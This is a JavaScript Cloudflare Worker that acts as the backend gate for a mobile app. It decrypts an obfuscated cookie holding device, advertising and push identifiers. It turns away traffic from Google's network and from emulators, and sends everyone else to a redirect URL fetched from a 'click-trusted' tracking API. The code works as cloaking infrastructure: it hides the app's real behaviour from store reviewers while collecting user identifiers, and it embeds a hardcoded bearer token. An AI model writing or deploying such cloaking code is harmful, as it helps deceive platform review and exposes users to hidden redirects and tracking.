/**
 * Cloudflare Worker — Unity-style sync intake (Cookie + encrypted body).
 *
 * Typex (5-rotor byte cipher). Local device/Google filters only;
 * spectoring/adspect lives on the upstream API (click-trusted), not here.
 * No HEAD follow on the upstream link. Result returned sync in HTTP body.
 *
 * Secrets:
 *   ACCESS_TOKEN_ENABLE   # upstream click token
 *
 * Endpoint: POST https://<host>/   (or any path)
 *   Cookie: data=<url-encoded Typex hex of pipe fields>
 *   Body:   url-encoded Typex hex of form fields (whole body)
 *   Also accepts X-Data header (same value as Cookie data=) for RN clients.
 */

const UPSTREAM_URL = "https://banda-track-api.space/api/click-trusted";

const BLOCK_MONITOR_URL =
  "https://adjust-binom-monitor.oleksandr-teamlead-unitydev.workers.dev/api/block-events";
const BLOCK_MONITOR_TOKEN =
  "73bcf638be7f5e6e3d2bea45852d3b5f22cf0ffd14706051a88a45c548e5f526";

const REQUIRED_FIELDS = [
  "appId",
  "deviceID",
  "adId",
  "pushToken",
  "referer",
  "oneLink",
  "naming",
  "userAgent",
  "app_version",
  "androidId"
];

/* ============================= */
/* Typex (5-rotor byte cipher)   */
/* https://en.wikipedia.org/wiki/Typex */
/* ============================= */

const TYPEX_KEY_STRING = "TYPEX-NO-KEY!!!";
const TYPEX_IV_STRING = "TYPEX-NO-IV!!!!";
const TYPEX_KEY_BYTES = new TextEncoder().encode(TYPEX_KEY_STRING);
const TYPEX_IV_BYTES = new TextEncoder().encode(TYPEX_IV_STRING);

function buildPerm(seed) {
  const a = new Uint8Array(256);
  for (let i = 0; i < 256; i++) a[i] = i;
  let s = seed >>> 0;
  for (let i = 255; i > 0; i--) {
    s = (Math.imul(s, 1664525) + 1013904223) >>> 0;
    const j = s % (i + 1);
    const tmp = a[i];
    a[i] = a[j];
    a[j] = tmp;
  }
  return a;
}

function invertPerm(perm) {
  const inv = new Uint8Array(256);
  for (let i = 0; i < 256; i++) inv[perm[i]] = i;
  return inv;
}

function buildReflector(seed) {
  const order = buildPerm(seed);
  const ref = new Uint8Array(256);
  for (let i = 0; i < 256; i += 2) {
    const a = order[i];
    const b = order[i + 1];
    ref[a] = b;
    ref[b] = a;
  }
  return ref;
}

function buildNotchSet(seed, count) {
  const order = buildPerm(seed);
  const set = new Set();
  for (let i = 0; i < count; i++) set.add(order[i]);
  return set;
}

const R0_FWD = buildPerm(0x54595045);
const R1_FWD = buildPerm(0x58524f54);
const R2_FWD = buildPerm(0x42524954);
const R3_FWD = buildPerm(0x4e4f5443);
const R4_FWD = buildPerm(0x53544550);
const R0_INV = invertPerm(R0_FWD);
const R1_INV = invertPerm(R1_FWD);
const R2_INV = invertPerm(R2_FWD);
const R3_INV = invertPerm(R3_FWD);
const R4_INV = invertPerm(R4_FWD);
const REFLECTOR = buildReflector(0x5245464c);
const NOTCHES3 = buildNotchSet(0x4e544348, 5);
const NOTCHES4 = buildNotchSet(0x4d4c5449, 7);

function throughRotorFwd(wiring, pos, v) {
  return (wiring[(v + pos) & 255] - pos + 256) & 255;
}

function throughRotorInv(invWiring, pos, v) {
  return (invWiring[(v + pos) & 255] - pos + 256) & 255;
}

function typexTransformBytes(data) {
  const src = data instanceof Uint8Array ? data : new Uint8Array(data || []);
  const out = new Uint8Array(src.length);
  const p0 = 0;
  const p1 = 0;
  let p2 = 0;
  let p3 = 0;
  let p4 = 0;

  for (let i = 0; i < src.length; i++) {
    p4 = (p4 + 1) & 255;
    if (NOTCHES4.has(p4)) {
      p3 = (p3 + 1) & 255;
      if (NOTCHES3.has(p3)) {
        p2 = (p2 + 1) & 255;
      }
    }

    let v = src[i];
    v = throughRotorFwd(R0_FWD, p0, v);
    v = throughRotorFwd(R1_FWD, p1, v);
    v = throughRotorFwd(R2_FWD, p2, v);
    v = throughRotorFwd(R3_FWD, p3, v);
    v = throughRotorFwd(R4_FWD, p4, v);
    v = REFLECTOR[v];
    v = throughRotorInv(R4_INV, p4, v);
    v = throughRotorInv(R3_INV, p3, v);
    v = throughRotorInv(R2_INV, p2, v);
    v = throughRotorInv(R1_INV, p1, v);
    v = throughRotorInv(R0_INV, p0, v);
    out[i] = v;
  }
  return out;
}

function encryptBytes(data, _key = TYPEX_KEY_BYTES) {
  return typexTransformBytes(data);
}

function decryptBytes(data, _key = TYPEX_KEY_BYTES, _legacyIv = TYPEX_IV_BYTES) {
  return typexTransformBytes(data);
}

function bytesToHex(bytes) {
  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0").toUpperCase()).join("");
}

function encryptHex(plain, key = TYPEX_KEY_BYTES) {
  return bytesToHex(encryptBytes(new TextEncoder().encode(plain), key));
}

function typexDecrypt(buffer) {
  return decryptBytes(buffer, TYPEX_KEY_BYTES, TYPEX_IV_BYTES);
}

function typexEncryptToHex(jsonStr) {
  return encryptHex(jsonStr, TYPEX_KEY_BYTES);
}


function hexToBytes(hex) {
  const normalized = String(hex || "").trim();
  if (!normalized || normalized.length % 2 !== 0) {
    throw new Error("Invalid hex");
  }
  const out = new Uint8Array(normalized.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(normalized.substr(i * 2, 2), 16);
  }
  return out;
}

function decryptHexString(hex) {
  try {
    const bytes = hexToBytes(hex);
    const decrypted = decryptBytes(bytes, TYPEX_KEY_BYTES, TYPEX_IV_BYTES);
    return new TextDecoder().decode(decrypted);
  } catch (e) {
    console.log("[DECRYPT_ERROR]", String(e));
    return "";
  }
}

function encryptHexString(plain) {
  return encryptHex(plain, TYPEX_KEY_BYTES);
}

function encryptedJsonResponse(obj, status = 200) {
  const json = JSON.stringify(obj);
  const encrypted = encryptHexString(json);

  console.log("[RESPONSE_TO_APP_ENCRYPTED]", {
    length: encrypted.length,
    preview: encrypted.slice(0, 120)
  });

  return new Response(encrypted, {
    status,
    headers: {
      "Content-Type": "text/plain; charset=utf-8",
      "Cache-Control": "no-store"
    }
  });
}

function emptyResponse(reason = "empty") {
  console.log("[RESPONSE_TO_APP_EMPTY]", { reason });

  return new Response("", {
    status: 200,
    headers: {
      "Cache-Control": "no-store"
    }
  });
}

function clean(value, max = 2048) {
  return String(value || "").trim().slice(0, max);
}

function short(value, max = 180) {
  const s = String(value || "");
  return s.length > max ? s.slice(0, max) + "..." : s;
}

function multiDecode(value) {
  let raw = String(value || "").trim();

  for (let i = 0; i < 3; i++) {
    try {
      const decoded = decodeURIComponent(raw);
      if (decoded === raw) break;
      raw = decoded;
    } catch {
      break;
    }
  }

  return raw.trim();
}

function decryptStrict(value, label = "value") {
  const raw = multiDecode(value);

  if (!raw) return "";

  if (!/^[0-9a-fA-F]+$/.test(raw)) {
    console.log("[DECRYPT_NOT_HEX]", {
      label,
      preview: short(raw)
    });
    return "";
  }

  const decoded = decryptHexString(raw);

  if (!decoded) {
    console.log("[DECRYPT_FAILED]", {
      label,
      preview: short(raw)
    });
    return "";
  }

  return decoded;
}

function parseMaybeJson(value) {
  const raw = clean(value, 4096);
  if (!raw) return "";

  try {
    return JSON.parse(raw);
  } catch {
    return raw;
  }
}

function getCookie(request, name) {
  const cookie = request.headers.get("Cookie") || "";
  const match = cookie.match(new RegExp(`${name}=([^;]+)`));
  return match ? match[1] : "";
}

function cleanUrl(value) {
  const raw = clean(value, 4096);
  if (!raw) return "";

  try {
    const url = new URL(raw);
    if (url.protocol !== "http:" && url.protocol !== "https:") return "";
    return url.toString();
  } catch {
    return "";
  }
}

function readEncryptedCookiePayload(request) {
  const encryptedCookieData =
    getCookie(request, "data") ||
    request.headers.get("X-Data") ||
    "";
  const decrypted = decryptStrict(encryptedCookieData, "cookie.data");

  if (!decrypted) {
    return { ok: false, payload: null };
  }

  console.log("[COOKIE_DECRYPTED_RAW]", short(decrypted, 300));

  const parts = decrypted.split("|");
  const out = {};

  for (let i = 0; i < REQUIRED_FIELDS.length; i++) {
    out[REQUIRED_FIELDS[i]] = clean(parts[i] || "", 4096);
  }

  out.naming = parseMaybeJson(out.naming);

  console.log("[COOKIE_DECRYPTED]", {
    fieldsCount: parts.length,
    appId: out.appId || "empty",
    deviceID: out.deviceID ? "present" : "empty",
    adId: out.adId ? "present" : "empty",
    pushToken: out.pushToken ? "present" : "empty",
    referer: out.referer ? "present" : "empty",
    oneLink: out.oneLink ? "present" : "empty",
    namingType: typeof out.naming,
    userAgent: out.userAgent ? "present" : "empty",
    app_version: out.app_version || "empty",
    androidId: out.androidId ? "present" : "empty"
  });

  return { ok: true, payload: out };
}

function parseWholeEncryptedBody(text) {
  const decrypted = decryptStrict(text, "body.whole");

  if (!decrypted) {
    console.log("[BODY_WHOLE_DECRYPT_FAILED]");
    return {};
  }

  console.log("[BODY_WHOLE_DECRYPTED_RAW]", {
    length: decrypted.length,
    value: short(decrypted, 1000)
  });

  const params = new URLSearchParams(decrypted);
  const out = {};

  for (const [key, value] of params.entries()) {
    out[key] = clean(value, 4096);
  }

  console.log("[BODY_WHOLE_DECRYPTED_FIELDS]", out);

  return out;
}

async function readFormBody(request) {
  const text = await request.text();

  console.log("[BODY_RAW]", {
    length: text.length,
    preview: short(text, 500)
  });

  const params = new URLSearchParams(text);
  const out = {};
  let parsedFieldsCount = 0;

  for (const [key, value] of params.entries()) {
    const decryptedValue = decryptStrict(value, `body.${key}`);

    if (decryptedValue) {
      out[key] = decryptedValue;
      parsedFieldsCount++;

      console.log("[BODY_FIELD_DECRYPTED]", {
        key,
        hasValue: true,
        value: short(decryptedValue, 500)
      });
    }
  }

  if (parsedFieldsCount > 0) {
    console.log("[BODY_DECRYPTED_FULL]", out);
    return out;
  }

  console.log("[BODY_FORM_FIELDS_EMPTY_TRY_WHOLE_DECRYPT]");

  return parseWholeEncryptedBody(text);
}

async function getCCByIp(ip) {
  try {
    if (!ip || ip === "unknown") return null;

    const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,countryCode,message`;
    const resp = await fetch(url);
    const data = await resp.json();

    if (data.status === "success") {
      console.log("[GEO_IP_API]", {
        ip,
        country: data.countryCode
      });
      return data.countryCode;
    }

    console.log("[GEO_IP_API_FAILED]", {
      ip,
      message: data.message || ""
    });

    return null;
  } catch (err) {
    console.log("[GEO_IP_API_ERROR]", String(err));
    return null;
  }
}

async function resolveCountry(request, ip) {
  const cfCountry = request.cf?.country || "";

  if (cfCountry) {
    console.log("[GEO_CLOUDFLARE]", {
      ip,
      country: cfCountry
    });
    return cfCountry;
  }

  return await getCCByIp(ip);
}

function isGoogleProvider(request) {
  const asOrg = request.cf?.asOrganization || "";
  const asn = request.cf?.asn;

  if (asn === 15169) return true;
  if (!asOrg) return false;
  return asOrg.toLowerCase().includes("google");
}

function isEmulatorUA(ua) {
  if (!ua) return true;

  const u = ua.toLowerCase();

  return (
    u.includes("sdk_gphone") ||
    u.includes("emulator") ||
    u.includes("generic") ||
    u.includes("google_sdk") ||
    u.includes("headless") ||
    u.includes("bot") ||
    u.includes("crawl")
  );
}

function reportBlock(ctx, {
  appId,
  blockedBy,
  reason,
  httpStatus = null,
  ip = null,
  adid = null,
  androidId = null,
}) {
  if (!ctx || !BLOCK_MONITOR_URL || !BLOCK_MONITOR_TOKEN) return;

  ctx.waitUntil(
    fetch(BLOCK_MONITOR_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${BLOCK_MONITOR_TOKEN}`,
      },
      body: JSON.stringify({
        appId,
        blockedBy,
        reason,
        httpStatus,
        ip,
        adid,
        androidId,
        occurredAt: new Date().toISOString(),
      }),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`Block monitor returned ${response.status}`);
        }
      })
      .catch((error) => {
        console.error("[block-monitor]", error.message);
      }),
  );
}

export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);

      if (url.pathname === "/favicon.ico") {
        return emptyResponse("favicon");
      }

      // Plain GET healthcheck only — skip WebSocket upgrade handshake
      const upgrade = (request.headers.get("Upgrade") || "").toLowerCase();
      if (request.method === "GET" && upgrade !== "websocket") {
        return new Response("OK", { status: 200 });
      }

      if (request.method !== "POST") {
        console.log("[METHOD_NOT_ALLOWED]", {
          method: request.method
        });
        return emptyResponse("method_not_allowed");
      }

      const ip =
        request.headers.get("cf-connecting-ip") ||
        request.headers.get("x-forwarded-for") ||
        "unknown";

      const country = await resolveCountry(request, ip);

      console.log("[REQUEST]", {
        ip,
        country,
        path: url.pathname,
        asn: request.cf?.asn || "",
        asOrg: request.cf?.asOrganization || "",
        cfRay: request.headers.get("cf-ray") || ""
      });

      const cookieResult = readEncryptedCookiePayload(request);

      if (!cookieResult.ok) {
        console.log("[COOKIE_DECRYPT_FAILED_RETURN_EMPTY]");
        return emptyResponse("cookie_decrypt_failed");
      }

      const cookiePayload = cookieResult.payload;
      const body = await readFormBody(request);

      const payload = {
        appId: clean(cookiePayload.appId, 160),
        deviceID: clean(cookiePayload.deviceID, 256),
        adId: clean(cookiePayload.adId, 256),
        pushToken: clean(cookiePayload.pushToken, 2048),

        referer: clean(cookiePayload.referer || body.referer || "", 4096),
        oneLink: clean(cookiePayload.oneLink || body.oneLink || "", 4096),
        naming: cookiePayload.naming || parseMaybeJson(body.naming),

        userAgent: clean(
          cookiePayload.userAgent ||
          body.userAgent ||
          "",
          2048
        ),

        app_version: clean(cookiePayload.app_version || body.app_version || "", 128),
        androidId: clean(cookiePayload.androidId || body.androidId || "", 256),

        event: clean(body.event || "app_start", 128),
        os_version: clean(body.android_version || body.os_version || "", 128),
        device_model: clean(body.device_model || "", 256),
        manufacturer: clean(body.manufacturer || "", 128),
        locale: clean(body.locale || "", 64),
        timezone: clean(body.timezone || "", 128),
        network: clean(body.network || "", 64),
        screen: clean(body.screen || "", 64),
        session_id: clean(body.session_id || "", 256),

        ip
      };

      console.log("[PAYLOAD_TO_BANDA_TRACK_DECRYPTED]", {
        appId: payload.appId,
        deviceID: payload.deviceID ? "present" : "empty",
        adId: payload.adId ? "present" : "empty",
        pushToken: payload.pushToken ? "present" : "empty",
        referer: payload.referer ? "present" : "empty",
        oneLink: payload.oneLink ? "present" : "empty",
        namingType: typeof payload.naming,
        userAgent: payload.userAgent ? "present" : "empty",
        app_version: payload.app_version,
        androidId: payload.androidId ? "present" : "empty",
        os_version: payload.os_version,
        device_model: payload.device_model,
        manufacturer: payload.manufacturer,
        locale: payload.locale,
        timezone: payload.timezone,
        network: payload.network,
        screen: payload.screen,
        session_id: payload.session_id ? "present" : "empty"
      });

      const clientIp = ip;
      const cf = request.cf || {};

      const ua = payload.userAgent || "";
      const headerUa = request.headers.get("User-Agent") || "";
      const googleBlocked = isGoogleProvider(request);
      const emulatorBlocked = isEmulatorUA(ua);
      console.log("[FILTER]", {
        google: googleBlocked,
        emulator: emulatorBlocked,
        uaPayload: ua || "(empty)",
        uaHeader: headerUa || "(empty)",
        uaUsed: ua || "(empty)",
      });

      if (googleBlocked || emulatorBlocked) {
        const reason = googleBlocked ? "google_provider" : "emulator_ua";
        console.log(
          "[Init] BLOCKED by local filter:",
          reason,
          "appId:",
          payload.appId,
          "ip:",
          clientIp,
          "asOrg:",
          cf.asOrganization || "n/a",
        );
        reportBlock(ctx, {
          appId: payload.appId,
          blockedBy: "api",
          reason,
          httpStatus: 202,
          ip,
          adid: payload.adid || payload.deviceID || null,
          androidId: payload.androidId || null,
        });
        return encryptedJsonResponse({ error: "error_202" });
      }

      const upstream = await fetch(UPSTREAM_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Forwarded-For": ip,
          "X-Client-IP": ip,
          "CF-Country": country || "",
          "CF-Ray": request.headers.get("cf-ray") || "",
          "X-Click-Token": env.ACCESS_TOKEN_ENABLE || ""
        },
        body: JSON.stringify(payload)
      });

      const upstreamStatus = upstream.status;
      const textResponse = await upstream.text();

      console.log("[BANDA_TRACK_RESPONSE]", {
        status: upstreamStatus,
        body: short(textResponse, 500)
      });

      if (upstreamStatus === 202) {
        console.log(
          "[Init] BLOCKED by banda (upstream 202), appId:",
          payload.appId,
          "ip:",
          clientIp,
          "body:",
          textResponse.slice(0, 200),
        );
        reportBlock(ctx, {
          appId: payload.appId,
          blockedBy: "api",
          reason: "banda_202",
          httpStatus: upstreamStatus,
          ip,
          adid: payload.adid || payload.deviceID || null,
          androidId: payload.androidId || null,
        });
        return encryptedJsonResponse({
          error: "error_202"
        });
      }

      const cleanResponse = textResponse
        .trim()
        .replace(/^"+|"+$/g, "")
        .replace(/^'+|'+$/g, "")
        .replace(/\\/g, "");

      const redirectInitial = cleanUrl(cleanResponse);

      console.log("[BANDA_TRACK_CLEAN_URL]", {
        upstreamStatus,
        redirectInitial: redirectInitial || "empty"
      });

      if (upstreamStatus === 200 && redirectInitial) {
        // No HEAD follow on the obtained link (Unity HEAD removed).
        const link =
          redirectInitial +
          (redirectInitial.includes("?") ? "&" : "?") +
          "sub_id_12=trusted";

        console.log("[Init] SUCCESS link to app:", link);

        console.log("[FINAL_TO_APP]", {
          redirectUrlInitial: link,
        });

        return encryptedJsonResponse({
          redirectUrlInitial: link
        });
      }

      console.log(
        "[Init] FALLBACK to app, status:",
        upstreamStatus,
        "body:",
        textResponse.slice(0, 300),
      );

      console.log("[INVALID_UPSTREAM_RESPONSE_RETURN_EMPTY]", {
        upstreamStatus,
        textResponse: short(textResponse, 500)
      });

      return emptyResponse("invalid_upstream_response");

    } catch (err) {
      console.log("[WORKER_ERROR_RETURN_EMPTY]", String(err));
      return emptyResponse("worker_error");
    }
  }
};
